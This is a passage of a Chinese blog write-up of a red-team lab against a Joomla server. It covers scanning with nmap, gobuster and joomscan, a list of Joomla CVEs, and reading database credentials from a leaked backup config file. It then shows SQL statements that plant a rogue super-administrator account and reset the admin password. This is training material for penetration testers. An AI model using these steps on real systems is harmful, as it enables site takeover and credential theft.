<!DOCTYPE html>
<html lang="zh-cn">
  <head>
    <meta charset="utf8"/>
    <meta name="viewport" content="initial-scale=1.0, width=device-width"/>
    <title>
      
        ATT&CK红队评估(三) | Blanks'Blog
      
    </title>
    <meta name="description" content=""/>
    <meta name="keywords" content=""/>
    
      <link rel="apple-touch-icon"
            sizes="180x180"
            href="/images/apple-touch-icon.png"/>
    
    
      <link rel="icon"
            type="image/png"
            sizes="32x32"
            href="/images/favicon-32x32.png"/>
    
    
      <link rel="icon"
            type="image/png"
            sizes="16x16"
            href="/images/favicon-16x16.png"/>
    
    
      <link rel="mask-icon"
            href="/images/logo.svg"
            color=""/>
    
    
    
      
  <style>
    @font-face {
        font-family:sourceHanSerif;
        src: url(/font/regular.ttf);
        font-weight: regular;
    }
  </style>

  <style>
    @font-face {
        font-family:sourceHanSerif;
        src: url(/font/bold.ttf);
        font-weight: bold;
    }
  </style>


    
    <link rel="stylesheet"
          type="text/css"
          href='/css/layout.css'/>
    
    
  <link rel="stylesheet" type="text/css" href="/css/post.css" />
  

  <meta name="generator" content="Hexo 6.3.0"></head>
  <body>
    <div class="head">
      <div class="nav">
        <a href='/' class="nav-logo">
          <img alt="logo" height="60px" width="60px" src="/images/logo.svg"/>
        </a>
        <input id="navBtn" type="checkbox"/>
        <div class="nav-menu">
          
            
              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">Notes</a>
            
          
          
        </div>
        <label class="nav-btn" for="navBtn"></label>
      </div>
    </div>
    <div class="body">
      
  <article class="post-content">
    <div class="post-inner--toc">
      <div class="post-content__head">
        <div class="post-title">ATT&CK红队评估(三)</div>
        <div class="post-info">
          
  <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-tag">#内网渗透</a><a href="/tags/ATT-CK/" class="post-tag">#ATT&CK</a><a href="/tags/joomla-CMS/" class="post-tag">#joomla CMS</a><a href="/tags/sc%E5%91%BD%E4%BB%A4/" class="post-tag">#sc命令</a><a href="/tags/%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/" class="post-tag">#脏牛提权</a>


          <span class="post-date">2023-05-25</span>
        </div>
      </div>
      
        <aside class="toc-outer">
          <div class="toc-title">目录</div>
          <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">外网WEB</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">信息搜集</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">Joomla  内容管理系统</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">存在历史漏洞：</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">Joomscan 扫描工具</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">目录扫描结果</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">数据库</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link"><span class="post-toc-text">添加管理员</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link"><span class="post-toc-text">修改密码</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">webshell</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">SSH</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">Centos 脏牛（CVE-2016-5195）提权</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">权限维持</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">Ubuntu  CVE-2021-3493  提权</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">进入内网</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">Centos 上线MSF</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">搭建MSF路由与代理</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">smb 扫描 存活</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">SMB爆破</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">PsExec</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">kiwi_cmd</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">IPC 远程连接</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">SC 命令</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">wmiexec</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text"></span></a></li></ol>
          <a href="#" class="toc-top">回到顶部</a>
        </aside>
      
      <div class="post-content__body">
        
          <div class="post-gallery">
            
          </div>
        
        <meta name="referrer" content="no-referrer">


<p><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/22356351/1684918702073-d80acc37-4a81-43cd-ad17-d1d8cddaef35.jpeg"><br><a name="rApj2"></a></p>
<h1><span id="外网web">外网WEB</span></h1><p><a name="qMrUd"></a></p>
<h2><span id="信息搜集">信息搜集</span></h2><p>已经知道目标IP地址 ： 192.168.1.110<br>对其进行 常规扫描信息搜集</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">nmap -A <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.110</span><br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684887622545-a93e5d51-e720-43a5-822c-9473c14cc8ad.png#averageHue=%2318191b&clientId=uebc9409c-fe30-4&from=paste&height=699&id=ue8282720&originHeight=1397&originWidth=1562&originalType=binary&ratio=2&rotation=0&showTitle=false&size=258056&status=done&style=none&taskId=u90b06393-8042-4c99-b0b8-d347be24cfe&title=&width=781" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684887717662-35c5fed0-819e-4c11-937b-b70788e90ab1.png#averageHue=%2318191b&clientId=uebc9409c-fe30-4&from=paste&height=229&id=uce87a45e&originHeight=425&originWidth=1398&originalType=binary&ratio=2&rotation=0&showTitle=false&size=71931&status=done&style=none&taskId=u359fdb64-eff9-495a-b334-9efea478582&title=&width=754" alt="image.png"><br>对其简单的Nmap 扫描 <br>发现存在三个端口  22 80 3306 <br>那就可以猜测 开放了80 端口，3306  是否存在phpmyadmin 页面等等 <br>看看http开放了啥</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">80</span>/tcp   <span class="hljs-built_in">open</span>  http    nginx <span class="hljs-number">1.9</span><span class="hljs-number">.4</span><br>| http-robots.txt: <span class="hljs-number">15</span> disallowed entries <br>| /joomla/administrator/ /administrator/ /<span class="hljs-built_in">bin</span>/ /cache/ <br>| /cli/ /components/ /includes/ /installation/ /language/ <br>|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/<br>|_http-title: Home<br>|_http-generator: Joomla! - Open Source Content Management<br>|_http-server-header: nginx/<span class="hljs-number">1.9</span><span class="hljs-number">.4</span><br></code></pre></td></tr></table></figure>
<p>存在nginx 可能存在端口转发啥的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684887996174-6e0fbe0d-4667-4911-90c1-5dd9bf8100e3.png#averageHue=%23d9eeec&clientId=uebc9409c-fe30-4&from=paste&height=716&id=u34aca26f&originHeight=1431&originWidth=2867&originalType=binary&ratio=2&rotation=0&showTitle=false&size=506585&status=done&style=none&taskId=ubaafd1bc-59ff-4e72-bf03-6303a220bfd&title=&width=1433.5" alt="image.png"><br>看着像一个博客系统 <br>其实nmap 已经扫描出来是啥cms了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">http-generator: Joomla! - Open Source Content Management<br></code></pre></td></tr></table></figure>
<p>是一个Joomla 的 内容管理系统  <br>对其先进行目录扫描</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#gobuster 工具</span><br>gobuster <span class="hljs-built_in">dir</span> -u http://<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.110</span>/  -w /usr/share/seclists/Discovery/Web-Content/directory-<span class="hljs-built_in">list</span>-<span class="hljs-number">1.0</span>.txt -x txt,php,html,jsp<br><span class="hljs-comment">#dirb 工具</span><br>dirb <span class="hljs-string">&quot;http://192.168.1.110&quot;</span>    <br><span class="hljs-comment">#dirsearch 工具</span><br>dirsearch -u http://<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.110</span>   <br></code></pre></td></tr></table></figure>
<p>先后台扫描着 ，先去看看这个内容管理系统是啥 ，是否存在近期漏洞<br><a name="b0isY"></a></p>
<h2><span id="joomla-内容管理系统">Joomla  内容管理系统</span></h2><p>Joomla是一套全球知名的内容管理系统。 [1]  Joomla是使用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/PHP/9337?fromModule=lemma_inlink">PHP</a>语言加上<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/10991669?fromModule=lemma_inlink">MySQL数据库</a>所开发的软件系统，最新版本是4.2.8 [2]  。可以在Linux、 <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Windows/165458?fromModule=lemma_inlink">Windows</a>、<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/MacOSX/4686971?fromModule=lemma_inlink">MacOSX</a>等各种不同的平台上执行。</p>
<p><a name="iahme"></a></p>
<h3><span id="存在历史漏洞"><strong>存在历史漏洞：</strong></span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python">(CVE-<span class="hljs-number">2015</span>-<span class="hljs-number">8562</span>)  Joomla <span class="hljs-number">3.4</span><span class="hljs-number">.5</span> 反序列化漏洞<br>本漏洞根源是PHP5<span class="hljs-number">.6</span><span class="hljs-number">.13</span>前的版本在读取存储好的session时，<br>如果反序列化出错则会跳过当前一段数据而去反序列化下一段数据。<br>而Joomla将session存储在Mysql数据库中，编码是utf8，当我们插入<span class="hljs-number">4</span>字节的utf8数据时则会导致截断。<br>截断后的数据在反序列化时就会失败，最后触发反序列化漏洞。<br><br>(CVE-<span class="hljs-number">2016</span>-<span class="hljs-number">8869</span>)  Joomla <span class="hljs-number">3.4</span><span class="hljs-number">.4</span>-<span class="hljs-number">3.6</span><span class="hljs-number">.3</span> 未授权创建特权用户<br>网站关闭注册的情况下仍可创建用户，默认状态下用户需要用邮件激活，但需要开启注册功能才能激活。<br><br>(CVE-<span class="hljs-number">2017</span>-<span class="hljs-number">14596</span>) Joomla! <span class="hljs-number">1.5</span> &lt;= <span class="hljs-number">3.7</span><span class="hljs-number">.5</span> LDAP注入绕过登录认证<br>通过在登录页面利用该漏洞进行攻击，非特权的远程攻击者可以提取出LDAP服务器中所有的用户凭证<br>(用于安装Joomla!），这些凭证包括特权用户以及Joomla！管理员的用户名以及密码。<br>获取到这些凭证之后，攻击者就可以使用这些信息来登录Joomla！的管理员控制面板并完全接管Joomla！，<br>或者通过上传自定义的Joomla！扩展实现远程代码执行并相关的Web服务器。<br><br>(CVE-<span class="hljs-number">2017</span>-<span class="hljs-number">8917</span>) Joomla <span class="hljs-number">3.7</span><span class="hljs-number">.0</span> QL注入漏洞<br>(CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">10238</span>）Joomal &lt;= <span class="hljs-number">3.9</span><span class="hljs-number">.15</span> 远程命令执行漏洞<br>(CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">11890</span>)  Joomla 远程命令执行漏洞<br>受影响的版本：<span class="hljs-number">3.9</span><span class="hljs-number">.17</span>之前的Joomla核心 用户要求：管理员帐户（非超级管理员） 获得访问权限：<br>创建一个新的超级管理员，然后触发RCE。<br><br>Joomla! com_fabrik <span class="hljs-number">3.9</span><span class="hljs-number">.11</span> 目录遍历漏洞   Version: <span class="hljs-number">3.9</span><br>Joomla component GMapFP <span class="hljs-number">3.30</span> 任意文件上传<br>Joomla <span class="hljs-number">3.4</span><span class="hljs-number">.6</span> - <span class="hljs-string">&#x27;configuration.php&#x27;</span> 远程代码执行<br><br>CVE-<span class="hljs-number">2023</span>-<span class="hljs-number">23752</span> 未授权访问   <span class="hljs-number">4.0</span><span class="hljs-number">.0</span>  - <span class="hljs-number">4.2</span><span class="hljs-number">.7</span>版本<br><br>参考: <br>Google<br>https://www.hacking8.com/bug-product/Joomla/Joomla-<span class="hljs-number">3</span>-<span class="hljs-number">3.4</span><span class="hljs-number">.6</span>-%E8%BF%9C%E7%A8%8B%E5%<span class="hljs-number">91</span>%BD%E4%BB%A4%E6%<span class="hljs-number">89</span>%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html<br></code></pre></td></tr></table></figure>

<p>存在漏洞数量不小，但是我们不知道的是现在这个Joomal 版本是多少 <br>经过搜索的得知存在 一个 关于 Joomla 的 漏洞扫描<br><a name="jqix2"></a></p>
<h3><span id="joomscan-扫描工具"><strong>Joomscan 扫描工具</strong></span></h3><p>是一个开源项目，其主要目的是实现漏洞检测的自动化，以增强Joomla CMS开发的安全性。该工具基于Perl开发，能够轻松无缝地对各种Joomla项目进行漏洞扫描，其轻量化和模块化的架构能够保证扫描过程中不会留下过多的痕迹。它不仅能够检测已知漏洞，而且还能够检测到很多错误配置漏洞和管理权限漏洞等等。还能够以HTML或文本格式导出扫描报<br>Kali 安装 ： apt install joomscan <br>扫描一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">joomscan --url http://<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.110</span><br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684895260854-f4daa5ca-9210-4b95-86b3-15548d449667.png#averageHue=%2317181b&clientId=uebc9409c-fe30-4&from=paste&height=793&id=uc02481b7&originHeight=1586&originWidth=1337&originalType=binary&ratio=2&rotation=0&showTitle=false&size=181152&status=done&style=none&taskId=uf0384fba-661b-4a5c-92cf-19b34a5d670&title=&width=668.5" alt="image.png"><br>扫描到了版本号  3.9.2 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684895433151-18ded3fa-67d5-411d-b40e-d94b3a846356.png#averageHue=%23d5dfca&clientId=uebc9409c-fe30-4&from=paste&height=648&id=uaaeb76fd&originHeight=1295&originWidth=1823&originalType=binary&ratio=2&rotation=0&showTitle=false&size=227117&status=done&style=none&taskId=udbe05297-5ab2-45dc-9217-5f7ab466fb8&title=&width=911.5" alt="image.png"><br>存在sql注入和 文件上传的<br>现在去看看扫描结果 找后台 ，找注入，找上传</p>
<p><a name="pH1QX"></a></p>
<h3><span id="目录扫描结果">目录扫描结果</span></h3><p>现在先回去看目录扫描 扫描出了啥<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684890629352-ebc94e5e-e94d-40a8-a0ae-9f3fbb7b4598.png#averageHue=%2318191c&clientId=uebc9409c-fe30-4&from=paste&height=748&id=ue554d5ec&originHeight=1496&originWidth=2038&originalType=binary&ratio=2&rotation=0&showTitle=false&size=386521&status=done&style=none&taskId=u890352a3-6605-41a1-87d9-278954f11ba&title=&width=1019" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684890634392-b19dcd2b-089d-4253-8ca7-f75f8f740a27.png#averageHue=%2318191b&clientId=uebc9409c-fe30-4&from=paste&height=655&id=u5014efb9&originHeight=1309&originWidth=1603&originalType=binary&ratio=2&rotation=0&showTitle=false&size=315758&status=done&style=none&taskId=u1011d2c9-38a1-4544-b0bd-4c283b1337e&title=&width=801.5" alt="image.png"><br>可疑目录</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">[<span class="hljs-number">20</span>:<span class="hljs-number">30</span>:<span class="hljs-number">50</span>] <span class="hljs-number">200</span> -   31B  - /administrator/logs/<br>[<span class="hljs-number">20</span>:<span class="hljs-number">30</span>:<span class="hljs-number">52</span>] <span class="hljs-number">200</span> -    5KB - /administrator/<br>[<span class="hljs-number">20</span>:<span class="hljs-number">30</span>:<span class="hljs-number">52</span>] <span class="hljs-number">200</span> -    5KB - /administrator/index.php<br>[<span class="hljs-number">20</span>:<span class="hljs-number">30</span>:<span class="hljs-number">56</span>] <span class="hljs-number">200</span> -   31B  - /<span class="hljs-built_in">bin</span>/<br>[<span class="hljs-number">20</span>:<span class="hljs-number">31</span>:01] <span class="hljs-number">200</span> -    2KB - /configuration.php~<br>[<span class="hljs-number">20</span>:<span class="hljs-number">31</span>:<span class="hljs-number">13</span>] <span class="hljs-number">200</span> -    3KB - /htaccess.txt<br>[<span class="hljs-number">20</span>:<span class="hljs-number">31</span>:<span class="hljs-number">57</span>] <span class="hljs-number">200</span> -    2KB - /web.config.txt<br>[<span class="hljs-number">20</span>:<span class="hljs-number">31</span>:<span class="hljs-number">49</span>] <span class="hljs-number">200</span> -    0B  - /templates/system/<br>[<span class="hljs-number">20</span>:<span class="hljs-number">31</span>:<span class="hljs-number">40</span>] <span class="hljs-number">200</span> -  829B  - /robots.txt<br></code></pre></td></tr></table></figure>
<p>后台地址：： <a target="_blank" rel="noopener" href="http://192.168.1.110/administrator/">http://192.168.1.110/administrator/</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684895524786-67a39bc1-7f3a-4e95-874d-b7179c6c97f0.png#averageHue=%23185386&clientId=uebc9409c-fe30-4&from=paste&height=521&id=u3c03cdbf&originHeight=1042&originWidth=2120&originalType=binary&ratio=2&rotation=0&showTitle=false&size=53906&status=done&style=none&taskId=u67a37b86-5bed-4eb3-a665-29b553e0dcd&title=&width=1060" alt="image.png"><br>htaccess.txt 泄露<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684895638799-d4573b17-ece4-4281-bbf4-bfe3addab570.png#averageHue=%231d1d25&clientId=uebc9409c-fe30-4&from=paste&height=700&id=ue5639dc9&originHeight=1399&originWidth=1616&originalType=binary&ratio=2&rotation=0&showTitle=false&size=279165&status=done&style=none&taskId=udaddffd4-69be-43fe-9697-0d655f8f08f&title=&width=808" alt="image.png"><br><a target="_blank" rel="noopener" href="http://192.168.1.110/web.config.txt">http://192.168.1.110/web.config.txt</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684895701166-db041bd9-0422-47ef-8764-6befcee20963.png#averageHue=%231e1e26&clientId=uebc9409c-fe30-4&from=paste&height=397&id=u0fb2f69b&originHeight=794&originWidth=1540&originalType=binary&ratio=2&rotation=0&showTitle=false&size=169968&status=done&style=none&taskId=uad0b5a53-9b9b-4484-b92a-7a9b6773118&title=&width=770" alt="image.png"><br>robots.txt 文件 存在的目录还是比较多的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684895762982-9b0c2368-0bbc-4a04-82bf-8616990e04cd.png#averageHue=%231e1e26&clientId=uebc9409c-fe30-4&from=paste&height=364&id=u2ca84984&originHeight=727&originWidth=1491&originalType=binary&ratio=2&rotation=0&showTitle=false&size=114928&status=done&style=none&taskId=u078e6822-e92e-4ed8-b6ed-57b4305b5a0&title=&width=745.5" alt="image.png"><br><a target="_blank" rel="noopener" href="http://192.168.1.110/configuration.php~">http://192.168.1.110/configuration.php~</a><br>是一个配置php文件 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684895834584-b7eb0f19-693e-4b2d-831e-00f340996b94.png#averageHue=%231d1d24&clientId=uebc9409c-fe30-4&from=paste&height=648&id=u8bf29b78&originHeight=1295&originWidth=2140&originalType=binary&ratio=2&rotation=0&showTitle=false&size=274367&status=done&style=none&taskId=u6500115f-cf8f-4122-b76f-84a38bb06b7&title=&width=1070" alt="image.png"><br>这部分信息是有用的信息 ，知道了绝对路径 ，数据库账号密码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">	public $dbtype = <span class="hljs-string">&#x27;mysqli&#x27;</span>;<br>	public $host = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br>	public $user = <span class="hljs-string">&#x27;testuser&#x27;</span>;<br>	public $password = <span class="hljs-string">&#x27;cvcvgjASD!@&#x27;</span>;<br>	public $db = <span class="hljs-string">&#x27;joomla&#x27;</span>;<br>	public $dbprefix = <span class="hljs-string">&#x27;am2zu_&#x27;</span>;<br>	public $mailer = <span class="hljs-string">&#x27;mail&#x27;</span>;<br>	public $mailfrom = <span class="hljs-string">&#x27;test@test.com&#x27;</span>;<br>	public $fromname = <span class="hljs-string">&#x27;test&#x27;</span>;<br>	public $sendmail = <span class="hljs-string">&#x27;/usr/sbin/sendmail&#x27;</span>;<br>	public $feed_limit = <span class="hljs-string">&#x27;10&#x27;</span>;<br>	public $log_path = <span class="hljs-string">&#x27;/var/www/html/administrator/logs&#x27;</span>;<br>	public $tmp_path = <span class="hljs-string">&#x27;/var/www/html/tmp&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p><a name="PisBn"></a></p>
<h3><span id="数据库">数据库</span></h3><p>连接数据库 ：： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">账号密码   testuser cvcvgjASD!@<br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684896194451-d62fe2e8-55da-4e11-99e9-4015594eb16c.png#averageHue=%2317181a&clientId=uebc9409c-fe30-4&from=paste&height=251&id=uf50fa540&originHeight=501&originWidth=1409&originalType=binary&ratio=2&rotation=0&showTitle=false&size=70181&status=done&style=none&taskId=u0efa5185-dc6e-43d6-b484-533186df780&title=&width=704.5" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">show databases;<br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684896422835-fc871db6-d279-4a05-9fe6-eafddcdb5fc4.png#averageHue=%2317181a&clientId=uebc9409c-fe30-4&from=paste&height=186&id=ufd0bce06&originHeight=371&originWidth=936&originalType=binary&ratio=2&rotation=0&showTitle=false&size=27445&status=done&style=none&taskId=u0eb3577f-a911-410e-b222-9534375bae1&title=&width=468" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">show tables;<br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684896554488-f63f26cf-c61d-41a4-9f28-01d6110a3364.png#averageHue=%23191a1c&clientId=uebc9409c-fe30-4&from=paste&height=395&id=u237bc91e&originHeight=790&originWidth=762&originalType=binary&ratio=2&rotation=0&showTitle=false&size=87810&status=done&style=none&taskId=u8eaf3001-e28d-4eb2-a777-6fbce12e034&title=&width=381" alt="image.png"><br>存在两个 users 表 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">am2zu_users   <br>umnbt_users  <br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684896654788-c3682940-2e34-44c3-b0a3-e64cca4e67ad.png#averageHue=%2318191b&clientId=uebc9409c-fe30-4&from=paste&height=480&id=uf17d9cb5&originHeight=959&originWidth=2254&originalType=binary&ratio=2&rotation=0&showTitle=false&size=136509&status=done&style=none&taskId=uabeff9f7-f53a-47f0-a79d-07a858ffbca&title=&width=1127" alt="image.png"><br>感觉是下面那个用户表 ，毕竟带有administrator <br>可是他的编码不知道是啥编码的 ，直接修改一个密码 或者 添加一个管理员用户<br><a name="bpnpG"></a></p>
<h4><span id="添加管理员">添加管理员</span></h4><p>添加一个管理员 <br>查看官方文档： <a target="_blank" rel="noopener" href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F&#x2F;zh-cn</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684897302449-efd86f17-a898-4457-b7ec-2f602ee66374.png#averageHue=%23f4f3f3&clientId=uebc9409c-fe30-4&from=paste&height=261&id=u145364b6&originHeight=522&originWidth=2461&originalType=binary&ratio=2&rotation=0&showTitle=false&size=147444&status=done&style=none&taskId=u2bf7c0e1-b05c-4313-9503-1b78b90d0f5&title=&width=1230.5" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">INSERT INTO `am2zu_users` (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`) VALUES (<span class="hljs-string">&#x27;Administrator2&#x27;</span>, <span class="hljs-string">&#x27;admin2&#x27;</span>, <span class="hljs-string">&#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, NOW(), NOW(), NOW());<br><br>INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`) VALUES (LAST_INSERT_ID(),<span class="hljs-string">&#x27;8&#x27;</span>);<br><br>select * <span class="hljs-keyword">from</span> am2zu_users;<br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684897500717-c95ef655-77f2-464c-a103-484dadb335c3.png#averageHue=%2318191b&clientId=uebc9409c-fe30-4&from=paste&height=578&id=ud1715eed&originHeight=1156&originWidth=2861&originalType=binary&ratio=2&rotation=0&showTitle=false&size=265403&status=done&style=none&taskId=u5eacc5b2-cfaa-4854-a856-3edb0ef1914&title=&width=1430.5" alt="image.png"><br>成功添加了一个admin &#x2F; secret 的管理员用户上去<br><a name="jYHOu"></a></p>
<h4><span id="修改密码">修改密码</span></h4><p>修改 administrator 的密码，因为不知道加密方式也不知道是什么编码就不知道密码了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">update am2zu_users set password=md5(&quot;123456&quot;) where id=891;<br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684897902524-0013a258-1d85-422c-be93-58ca6281453f.png#averageHue=%2318191b&clientId=uebc9409c-fe30-4&from=paste&height=68&id=u403c20a1&originHeight=136&originWidth=1566&originalType=binary&ratio=2&rotation=0&showTitle=false&size=27257&status=done&style=none&taskId=ucb5e1339-8f4a-4697-98f3-74ff9948557&title=&width=783" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select * from am2zu_users where id=891;<br></code></pre></td></tr></table></figure>
